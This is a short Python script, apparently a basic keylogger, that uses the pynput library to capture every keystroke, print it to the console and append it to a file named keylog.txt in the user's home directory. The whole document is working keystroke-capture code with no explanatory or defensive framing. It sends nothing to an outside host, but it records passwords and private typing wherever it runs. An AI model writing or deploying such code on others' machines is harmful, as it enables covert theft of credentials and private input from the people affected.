from pynput import keyboard
import os
log = os.path.expanduser("~/keylog.txt")
def on_press(key):
    try:
        print(f"Key pressed: {key}")
        with open(log, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        print(f"Special key pressed: {key}")
        with open(log, "a") as f:
            f.write(f"[{key}]")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
